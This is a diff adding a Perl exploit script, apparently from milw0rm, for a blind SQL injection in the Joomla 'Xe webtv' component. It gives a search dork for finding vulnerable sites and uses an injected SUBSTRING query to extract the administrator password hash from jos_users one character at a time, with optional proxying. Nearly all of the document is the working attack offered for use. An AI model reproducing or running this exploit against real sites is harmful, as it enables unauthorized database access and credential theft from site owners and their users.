@@ -1,0 +1,115 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[1])
+{
+  print "                                                                  \n";
+    print "   ################################################################\n";
+  print "   #   Joomla Component Xe webtv Blind SQL Injection Exploit      #\n";
+  print "   #   Author:His0k4 [ALGERIAN HaCkeR]                            #\n";
+  print "   #                                                              #\n";
+  print "   #   Conctact: His0k4.hlm[at]gamil.com                          #\n";
+  print "   #   Greetz:   All friends & muslims HacKeRs                    #\n";
+  print "   #   Greetz2:  http://www.dz-secure.com                         #\n";
+  print "   #             http://www.palcastle.org/cc                      #\n";
+  print "   #                                                              #\n";
+  print "   #   Dork:    inurl:com_xewebtv                                 #\n";
+  print "   #   Usage:   perl xewebtv.pl host path <options>               #\n";
+  print "   #   Example: perl xewebtv.pl www.host.com /joomla/ -t 11 -c 2  #\n";
+  print "   #                                                              #\n";
+  print "   #   Options:                                                   #\n";
+  print "   #     -t    Valid  tv id                                       #\n";
+  print "   #     -c    Category value of the following id                 #\n";
+  print "   #   Note:                                                      #\n";
+  print "   #   You can change the match string if you need that           #\n";
+  print "   ################################################################\n";
+
+  exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $cid     = $ARGV[2];
+my $tid     = $ARGV[3];
+
+my %options = ();
+GetOptions(\%options, "c=i", "p=s", "t=i");
+
+print "[~] Exploiting...\n";
+
+if($options{"c"})
+{
+  $cid = $options{"c"};
+}
+
+if($options{"t"})
+{
+  $tid = $options{"t"};
+}
+
+syswrite(STDOUT, "[~] MD5-Hash: ", 14);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+  my $f = 0;
+  my $h = 48;
+  while(!$f && $h <= 57)
+  {
+    if(istrue2($host, $path, $cid, $tid, $i, $h))
+    {
+      $f = 1;
+      syswrite(STDOUT, chr($h), 1);
+    }
+    $h++;
+  }
+  if(!$f)
+  {
+    $h = 97;
+    while(!$f && $h <= 122)
+    {
+      if(istrue2($host, $path, $cid, $tid, $i, $h))
+      {
+        $f = 1;
+        syswrite(STDOUT, chr($h), 1);
+      }
+      $h++;
+    }
+  }
+}
+
+print "\n[~] Exploiting done\n";
+
+sub istrue2
+{
+  my $host  = shift;
+  my $path  = shift;
+  my $cid   = shift;
+  my $tid   = shift;
+  my $i     = shift;
+  my $h     = shift;
+ 
+  my $ua = LWP::UserAgent->new;
+  my $query = "http://".$host.$path."index.php?option=com_xewebtv&Itemid=60&func=detail&id=".$tid." and (SUBSTRING((SELECT password FROM jos_users LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
+ 
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+ 
+  my $resp = $ua->get($query);
+  my $content = $resp->content;
+  my $regexp = "viewcategory&catid=".$cid."";
+ 
+  if($content =~ /$regexp/)
+  {
+    return 1;
+  }
+  else
+  {
+    return 0;
+  }
+
+}
+
+# milw0rm.com [2008-06-28]
